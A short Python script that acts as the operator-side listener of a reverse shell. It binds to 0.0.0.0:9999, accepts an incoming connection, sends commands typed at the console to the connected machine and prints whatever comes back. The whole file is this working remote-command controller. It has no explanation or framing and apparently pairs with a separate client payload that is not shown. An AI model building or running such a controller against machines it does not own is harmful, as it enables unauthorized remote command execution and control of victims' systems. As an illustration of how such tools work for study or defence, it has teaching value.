import socket
import sys

def create_socket():
    global host
    global port 
    global s

    host = "0.0.0.0"
    port = 9999

    try:
        s = socket.socket()
    except socket.error as e:
        print(f"Socket Exception: {str(e)}")

def bind_socket():
    global host
    global port 
    global s

    print(f"Binding to {host}:{port}")

    try:
        s.bind((host,port))
        print("Binding Successful!")
        s.listen(5)

    except socket.error as e:
        print(f"Socket Exception: {str(e)}")
        print("Retrying...")
        bind_socket()

def accept_socket():
    connection, address = s.accept()
    print(f"New Connection at {address[0]}, Port {address[1]}")

    send_commands(connection)

    connection.close()

def send_commands(connection):
    while True:
        cmd = input()

        if cmd == "quit":
            connection.close()
            s.close()
            sys.exit()


        # use str.encode to convert string to bytes
        if len(str.encode(cmd)) > 0: # check if command is not null
            connection.send(str.encode(cmd))

            client_response = connection.recv(1024).decode("utf-8") # 1024 = bytes to read at once, utf-8 = encoding type
            print(client_response, end="")


def main():
    create_socket()
    bind_socket()
    accept_socket()

if __name__ == "__main__":
    main()